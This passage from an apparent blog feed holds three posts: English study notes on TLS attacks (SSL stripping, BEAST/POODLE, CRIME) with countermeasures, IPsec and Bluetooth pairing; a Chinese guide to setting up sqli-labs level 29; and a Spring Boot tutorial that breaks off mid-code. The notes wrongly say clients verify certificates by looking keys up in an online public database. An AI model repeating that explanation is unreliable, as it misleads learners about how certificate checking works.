<p>Eventhough the client verified the certificate, the attcker has no idea what the private key of the server, so he cannot decrypt the key transport and also cannot get the shared key generated later.</p>
<h3 id="Scenario-2"><a href="#Scenario-2" class="headerlink" title="Scenario 2"></a>Scenario 2</h3><p>Attacker sends client a fake certificate for google.com, will client uses the fake public key to generate a symmetric key?</p>
<p><strong>Solution</strong></p>
<p>After receiving the fake certificate, client would look up from the online public database for the public key of the certificate received to verify the certificate. Obviously, the certificate is fake and the website will then be labelled as not secure and the attack failed.</p>
<h2 id="Common-Attacks"><a href="#Common-Attacks" class="headerlink" title="Common Attacks"></a>Common Attacks</h2><h3 id="SSL-Stripping-Attack"><a href="#SSL-Stripping-Attack" class="headerlink" title="SSL Stripping Attack"></a>SSL Stripping Attack</h3><p>Attacker modifies web traffic to trick a client into accepting http connection instead of https </p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612172551.png" alt="SSL stripping attack"></p>
<p><strong>Countermeasure</strong></p>
<p>Server tells browser upon first visit to only accept HTTPS(not HTTP) for future requests to this domain.</p>
<h3 id="BEASAT-POODLE"><a href="#BEASAT-POODLE" class="headerlink" title="BEASAT/POODLE"></a>BEASAT/POODLE</h3><p>Browser Exploit Against SSL/TLS / Padding Oracle On Downgraded Legacy</p>
<ul>
<li>Attacker exploits Bugs in encryption/MAC mode of operation algorithm in TLS 1.0 to extract information on secret key.</li>
</ul>
<p><strong>Countermeasure</strong></p>
<p>Patches to TLS algorithms/implementations.</p>
<h3 id="Compression-ratio-info-leak-Made-Easy-CRIME"><a href="#Compression-ratio-info-leak-Made-Easy-CRIME" class="headerlink" title="Compression ratio info-leak Made Easy(CRIME)"></a>Compression ratio info-leak Made Easy(CRIME)</h3><p>TLS has a compress-then-encrypt mode; Compressed data length no hidden by encryption, reveals information to attacker on secret web site cookies. </p>
<p><strong>Countermeasure</strong></p>
<p>Disable TLS compression, avoid if possible record layer compression.</p>
<h1 id="IPsec-Protocol"><a href="#IPsec-Protocol" class="headerlink" title="IPsec Protocol"></a>IPsec Protocol</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>IPsec</code> stands for <strong>Internet Protocol Security</strong>, and is common used by VPN(<strong>Virtual Private Network</strong>).</p>
<h2 id="IPsec-methods"><a href="#IPsec-methods" class="headerlink" title="IPsec methods"></a>IPsec methods</h2><h3 id="AH-Authentication-Header"><a href="#AH-Authentication-Header" class="headerlink" title="AH - Authentication Header"></a>AH - Authentication Header</h3><p>AH can only authenticate data, and it cannot encrypt data. It adds an Authentication after the <strong>original IP header</strong>. AH authenticate the whole IP packet.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204412.png" alt="authentication header"></p>
<p><strong>Security parameters index</strong>: point to entry corresponding to browser/server; includes info on shared key.</p>
<p><strong>Sequence Number</strong> is used for freshness vs replay attacks</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612204929.png" alt="AH example"></p>
<h3 id="ESP-Encapsulating-Security-Payload"><a href="#ESP-Encapsulating-Security-Payload" class="headerlink" title="ESP - Encapsulating Security Payload"></a>ESP - Encapsulating Security Payload</h3><p><strong>ESP supports both Authentication and Encryption.</strong> However, ESP does not encrypt and authenticate the IP header.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205320.png" alt="ESP"></p>
<h2 id="Modes"><a href="#Modes" class="headerlink" title="Modes"></a>Modes</h2><ul>
<li><strong>Transport Mode</strong><ul>
<li>IP packet inserted with IPsec header(AH header/ESP header)</li>
</ul>
</li>
<li><strong>Tunnel Mode</strong><ul>
<li><strong>original packet preserved</strong> incl original header, new header added/prepended(at the begining of the whole packet)</li>
</ul>
</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220612205922.png" alt="modes"></p>
<h1 id="PAN"><a href="#PAN" class="headerlink" title="PAN"></a>PAN</h1><h2 id="Introduction-2"><a href="#Introduction-2" class="headerlink" title="Introduction"></a>Introduction</h2><p><code>PAN</code> stands for <strong>Personal Area Network</strong>. This technique is mainly used by Bluetooth. </p>
<p><strong>Bluetooth’s Secure Connections</strong></p>
<blockquote>
<p>leverage on <strong>human channel</strong> during pairing, e.g.</p>
<ul>
<li><p>compare passkey on both devices</p>
</li>
<li><p>see passkey on one, type into the other</p>
</li>
<li><p>type same passkey into both</p>
</li>
<li><p>which option, depends on device I/O capability </p>
</li>
</ul>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
<p><a href="https://blog.csdn.net/qq_38265137/article/details/89423551">https://blog.csdn.net/qq_38265137/article/details/89423551</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli labs第29关tomcat+java环境搭建排坑</title>
    <url>/2021/07/07/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/</url>
    <content><![CDATA[<h1 id="Sqli-labs第29关环境搭建"><a href="#Sqli-labs第29关环境搭建" class="headerlink" title="Sqli labs第29关环境搭建"></a>Sqli labs第29关环境搭建</h1><h2 id="搭建原因"><a href="#搭建原因" class="headerlink" title="搭建原因"></a>搭建原因</h2><p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140528351.png" alt="image-20210707140528351"></p>
<p>通过上面的图，我们其实可以知道，29-32这几关其实是有一个<code>tomcat(jsp)</code>这层作为一个waf，相当于一个中介，你最后操作的对象其实是在<code>php</code>环境上，而我们要在这种环境下练习我们的sql注入技巧，所以我们需要搭建相关环境<code>（tomcat 服务器、jdk、mysql-connector-java.）</code>。</p>
<span id="more"></span>

<h2 id="搭建步骤-排坑"><a href="#搭建步骤-排坑" class="headerlink" title="搭建步骤+排坑"></a>搭建步骤+排坑</h2><p>在做sqli labs第29关的时候，因为环境搭建不上废了大半天，后来网上找了下，其实已经有前辈写出来了<a href="https://blog.csdn.net/qq_43579362/article/details/104298144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162562221916780366560572%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162562221916780366560572&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-104298144.first_rank_v2_pc_rank_v29&utm_term=sqlilab+tomcat%E6%90%AD%E5%BB%BA&spm=1018.2226.3001.4187">详细的搭建过程</a>，但其中有几点没提到，所以会导致一些错误（而网上这关的搭建教程少之又少），这里记录一下我自己的操作，排下坑。</p>
<p>首先还是按照<a href="https://blog.csdn.net/qq_43579362/article/details/104298144?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162562221916780366560572%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162562221916780366560572&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-104298144.first_rank_v2_pc_rank_v29&utm_term=sqlilab+tomcat%E6%90%AD%E5%BB%BA&spm=1018.2226.3001.4187">详细的搭建过程</a>操作，使用KALI搭建，只是中间需要注意几点</p>
<ul>
<li>mysql处登录是mysql -uroot -p,默认的话密码为空</li>
<li>最后搭建好tomcat后，要修改一下29-32关的代码</li>
</ul>
<p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140149367.png" alt="image-20210707140149367"></p>
<p>有网址的地方要修改成你搭建的php环境下的网址</p>
<p><img src="/image/Sqli-labs%E7%AC%AC29%E5%85%B3tomcat-java%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8E%92%E5%9D%91/image-20210707140241593.png" alt="image-20210707140241593"></p>
<p>第32关处注意也要修改数据库信息。</p>
<ul>
<li><strong>最后一个大坑</strong>，我修改好所有东西以后依然访问出错，之前一直以为是配置有问题，废了很多时间，最后重新启动虚拟机，把所有服务都重启了一遍，就正常了。</li>
</ul>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-常见场景(2)</title>
    <url>/2021/07/17/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>非常感谢<a href="https://space.bilibili.com/663528522">三根草堂</a>师父的<code>Spring Boot</code>系列教程，内容基本来源于<strong>三根草堂</strong>师父，此笔记接上一篇<a href="https://leihehehe.github.io/2021/07/16/SpringBoot-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/">SpringBoot-基础入门笔记(1)</a></p>
<h1 id="Junit单元测试"><a href="#Junit单元测试" class="headerlink" title="Junit单元测试"></a>Junit单元测试</h1><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="编写测试类"><a href="#编写测试类" class="headerlink" title="编写测试类"></a>编写测试类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> HelloController helloController;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line">System.out.println(helloController);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>测试类需要和启动类在同一个包下（即相同的包结构），当然也可以指定<code>Classes</code>来指定启动类</p>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2/image-20210717200054898.png" alt="image-20210717200054898"></p>
<h2 id="兼容老版本"><a href="#兼容老版本" class="headerlink" title="兼容老版本"></a>兼容老版本</h2><p><strong>vintage依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>org.junit.Test对应的是Junit4的版本，就搭配@RunWith注解来使用。<br><strong>SpringBoot2.2.0之前版本的写法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="comment">//import org.junit.jupiter.api.Test;</span></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> HelloController helloController;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">System.out.println(<span class="number">1</span>);</span><br><span class="line">System.out.println(helloController);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Junit常见问题"><a href="#Junit常见问题" class="headerlink" title="Junit常见问题"></a>Junit常见问题</h2><p>如果Junit的<code>Test Class</code>没有放在和你的启动Class同一<code>package</code>格式下，会出现错误。</p>
<p>有两个解决方法</p>
<ul>
<li>将Test Class放回与启动Class同一<code>package</code>结构下</li>
<li>在<code>@SpringBootTest</code>注释处指定Classses=你的启动类.class</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//unit test</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = HelloApplication.class)</span><span class="comment">//此处指定你的启动类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApplicationTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJunit</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="number">1</span>);</span><br><span class="line">    System.out.println(helloController);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Mybatis整合"><a href="#Mybatis整合" class="headerlink" title="Mybatis整合"></a>Mybatis整合</h1><h2 id="创建database"><a href="#创建database" class="headerlink" title="创建database"></a>创建database</h2><p>我以<code>mysql</code>为例子，先给他导入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*Table structure for table `user` */</span><br><span class="line">DROP TABLE IF EXISTS `user`;</span><br><span class="line">CREATE TABLE `user` (</span><br><span class="line">`id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">`username` varchar(50) DEFAULT NULL,</span><br><span class="line">`age` int(11) DEFAULT NULL,</span><br><span class="line">`address` varchar(50) DEFAULT NULL,</span><br><span class="line">PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;</span><br><span class="line">/*Data for the table `user` */</span><br><span class="line">insert into `user`(`id`,`username`,`age`,`address`) values (2,&#x27;pdd&#x27;,25,&#x27;上海&#x27;),</span><br><span class="line">(3,&#x27;UZI&#x27;,19,&#x27;上海11&#x27;),(4,&#x27;RF&#x27;,19,NULL),(6,&#x27;三更&#x27;,14,&#x27;请问2&#x27;),(8,&#x27;test1&#x27;,11,&#x27;cc&#x27;),</span><br><span class="line">(9,&#x27;test2&#x27;,12,&#x27;cc2&#x27;);</span><br><span class="line">/*40101 SET SQL_MODE=@OLD_SQL_MODE */;</span><br><span class="line">/*40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;</span><br><span class="line">/*40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;</span><br><span class="line">/*40111 SET SQL_NOTES=@OLD_SQL_NOTES */;</span><br></pre></td></tr></table></figure>

<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718114106182.png" alt="image-20210718114106182"></p>
<h2 id="Java中创建entity"><a href="#Java中创建entity" class="headerlink" title="Java中创建entity"></a>Java中创建entity</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leihehe.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="添加依赖-1"><a href="#添加依赖-1" class="headerlink" title="添加依赖"></a>添加依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--myBatis的启动器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--myBatis的驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里<code>mybatis-spring-boot-starter</code>的版本号需要指定，我们可以通过<a href="https://github.com/mybatis/spring-boot-starter">spring-boot-starter github</a>上的<strong>requirement</strong>看到不同<code>JDK</code>和<code>SpringBoot</code>版本对应的<code>mybatis</code>版本号，这里我选择<code>2.2.0</code></p>
<h2 id="配置数据库信息"><a href="#配置数据库信息" class="headerlink" title="配置数据库信息"></a>配置数据库信息</h2><p>在<code>yaml</code>文件中写入数据</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置数据库,下面的SpringBootLearn是数据库名字</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/SpringBootLearn?characterEncoding=utf-8&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置mybatis</span></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*Mapper.xml</span> <span class="comment"># mapper映射文件路径,是在resources/mapper下</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.leihehe.domain</span> <span class="comment"># 配置哪个包下的类有默认的别名,我们的entity是放在domain下的</span></span><br></pre></td></tr></table></figure>

<h2 id="Mapper文件"><a href="#Mapper文件" class="headerlink" title="Mapper文件"></a>Mapper文件</h2><p>在resources里创建mapper文件夹/mapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.leihehe.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.leihehe.domain.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="Web开发"><a href="#Web开发" class="headerlink" title="Web开发"></a>Web开发</h1><h2 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h2><blockquote>
<p>静态资源可以放到 resources/static (或者 resources/public 或者resources/resources 或者 resources/META-INF/resources ) 中即可。</p>
<p>静态资源放完后，例如我们想访问文件resources/static/index.html 只需要在访问时资源路径写成/index.html即可。</p>
<p>例如我们想访问文件：resources/static/pages/login.html 访问的资源路径写成： /pages/login.html</p>
</blockquote>
<p><img src="/image/SpringBoot-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF-2-%E6%9B%B4%E6%96%B0%E4%B8%AD/image-20210718161702479.png" alt="image-20210718161702479"></p>
<h3 id="修改静态资源访问目录"><a href="#修改静态资源访问目录" class="headerlink" title="修改静态资源访问目录"></a>修改静态资源访问目录</h3><p>在<code>application.xml</code>中修改</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记住static path就可以了</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">static-path-pattern:</span> <span class="string">/res/**</span></span><br><span class="line">    <span class="comment">#默认是/**</span></span><br></pre></td></tr></table></figure>

<h3 id="修改静态资源存放目录"><a href="#修改静态资源存放目录" class="headerlink" title="修改静态资源存放目录"></a>修改静态资源存放目录</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#记住static location就可以了</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> <span class="string">classpath:/abc</span></span><br><span class="line">      <span class="comment">#这样静态资源就需要放在resources/abc/下了</span></span><br></pre></td></tr></table></figure>

<p>也可以设置多个static存放目录</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span> </span><br><span class="line">     	 <span class="bullet">-</span> <span class="string">classpath:/abc</span></span><br><span class="line">     	 <span class="bullet">-</span> <span class="string">classpath:/static</span></span><br><span class="line">      <span class="comment">#这样静态资源可以放在以上两个文件夹中，同时都可以被访问到</span></span><br></pre></td></tr></table></figure>

<h2 id="RequestMapping请求映射规则"><a href="#RequestMapping请求映射规则" class="headerlink" title="@RequestMapping请求映射规则"></a>@RequestMapping请求映射规则</h2><h3 id="指定请求路径"><a href="#指定请求路径" class="headerlink" title="指定请求路径"></a>指定请求路径</h3><ul>
<li><code>@RequestMapping</code>可以放在<code>method</code>上面，也可以放在<code>Class</code>上面</li>
<li><code>path</code>或者<code>value</code>属性都可以用来指定请求路径</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span><span class="comment">//该处规定 只有访问/test才能触发这个controller</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span><span class="comment">//只有访问/test/hello才能触发</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/testPath&quot;)</span><span class="comment">//只有访问/test/testPath 才能触发</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">testPath</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testPath&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求方式"><a href="#指定请求方式" class="headerlink" title="指定请求方式"></a>指定请求方式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/testMethod&quot;,method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者我们可以更简便一点：</p>
<blockquote>
<p>@PostMapping 等价于 @RequestMapping(method = RequestMethod.POST)<br>@GetMapping 等价于 @RequestMapping(method = RequestMethod.GET)<br>@PutMapping 等价于 @RequestMapping(method = RequestMethod.PUT)<br>@DeleteMapping 等价于 @RequestMapping(method = RequestMethod.DELETE)</p>
</blockquote>
<h3 id="指定请求参数"><a href="#指定请求参数" class="headerlink" title="指定请求参数"></a>指定请求参数</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod&quot;,params = &quot;a&quot;)</span><span class="comment">//post中必须要有a值</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod1&quot;,params = &quot;!a&quot;)</span><span class="comment">//post中必须不能有a值</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod2&quot;,params = &quot;a=1&quot;)</span><span class="comment">//post中必须有a值且a值必须为1</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod3&quot;,params = &quot;a!=1&quot;)</span><span class="comment">//post中必须有a值且a值不能为1</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;post&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="指定请求头"><a href="#指定请求头" class="headerlink" title="指定请求头"></a>指定请求头</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod&quot;,params = &quot;a&quot;,headers = &quot;deviceType&quot;)</span><span class="comment">//请求头必须是deviceType</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/testMethod1&quot;,headers = &quot;!deviceType&quot;)</span><span class="comment">//请求头必须不能是deviceType</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testMethod1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;header&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(value = 